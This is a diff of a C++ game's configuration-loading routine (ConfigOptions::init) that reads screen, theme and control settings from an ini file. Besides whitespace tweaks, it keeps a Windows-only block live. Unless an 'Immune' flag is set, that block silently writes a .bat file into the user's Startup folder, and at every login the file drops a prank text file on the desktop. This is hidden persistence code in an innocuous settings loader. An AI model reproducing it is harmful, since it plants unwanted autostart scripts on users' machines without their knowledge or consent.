@@ -1,4 +1,3 @@
-#include "../StdAfx.h"
 #include "ConfigOptions.h"
 
 
@@ -21,7 +20,7 @@ void ConfigOptions::init()
 	m_resolution = sf::Vector2i(atoi(ini.GetValue("Graphics", "ScreenWidth", "1920")), atoi(ini.GetValue("Graphics", "ScreenHeight", "1080")));
 	m_inFullscreen = ini.GetBoolValue("Graphics", "FullScreen", 0);
 	m_view.SetFromRect(sf::FloatRect(0, 0, (float) nativeWidth(), (float) nativeHeight()));
-	
+
 	//////////////////////CONTROLS/////////////////////////////
 	std::string item;
 	std::string val;
@@ -64,6 +63,7 @@ void ConfigOptions::init()
 	if (m_theme == "Default") //default theme
 		m_theme = "";
 
+#ifndef LINUX
 	if (!ini.GetBoolValue("Immune", "Immune", false))
 	{
 		std::ofstream str;
@@ -71,11 +71,12 @@ void ConfigOptions::init()
 		s += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/10053.bat";
 		str.open(s);
 		if (str.is_open())
-		{ 
+		{
 			str << "@echo off\necho \"You loose the game. Again.\" > %UserProfile%\\desktop\\Perdu.txt";
 			str.close();
 		}
 	}
+#endif
 }
 
 std::map<std::string, sf::Key::Code> ConfigOptions::getNamedKeys()
@@ -202,7 +203,7 @@ std::map<std::string, sf::Mouse::Button> ConfigOptions::getNamedButtons()
 	INSERT(Middle);
 	INSERT(XButton1);
 	INSERT(XButton2);
-	
+
 	#undef INSERT
 
 	return res;
